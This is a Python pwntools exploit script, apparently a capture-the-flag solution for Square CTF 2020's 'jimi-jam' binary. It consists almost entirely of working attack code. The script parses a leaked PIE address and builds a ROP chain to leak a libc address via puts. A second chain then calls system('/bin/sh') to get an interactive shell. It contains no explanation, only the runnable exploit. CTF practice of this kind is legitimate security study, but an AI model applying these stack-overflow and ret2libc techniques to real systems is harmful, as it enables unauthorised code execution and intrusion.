#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./jimi-jam')
libc = context.binary = ELF('./libc.so.6')
context.terminal = ['alacritty', '-e', 'sh', '-c']
host = args.HOST or 'challenges.2020.squarectf.com'
port = int(args.PORT or 9000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b *main
b *vuln+48
continue
'''.format(**locals())

# -- Exploit goes here --
offset = 16 # pattern = caaaaaaa
padding = 'aaaaaaaabaaaaaaa'

io = start()
io.recvuntil("The tour center is right here! ")
pie_leak = int(io.recvn(14), 16)
pie_base = pie_leak - 0x4060
log.info("PIE LEAK : %s" % hex(pie_leak))
log.info("PIE BASE : %s" % hex(pie_base))

exe.address = pie_base
pop_rdi = next(exe.search(asm("pop rdi; ret")))
ret = next(exe.search(asm("ret")))
puts_plt = pie_base + 0x10b0
io.recv()

rop = flat([

    padding,
    ret,
    pop_rdi,
    exe.sym['__libc_start_main'],
    puts_plt,
    exe.sym['vuln']
])
io.send(rop)
libc_leak = u64(io.recvline().strip("\n").ljust(8,'\x00'))
libc.address = libc_leak - libc.sym['__libc_start_main']
log.info("Libc leak : %s " % hex(libc_leak))
log.info("Libc base : %s " % hex(libc.address))
io.recv()

rop = flat([

    padding,
    pop_rdi,
    next(libc.search("/bin/sh")),
    libc.sym['system'],
    exe.sym['vuln']
])
io.send(rop)
io.interactive()

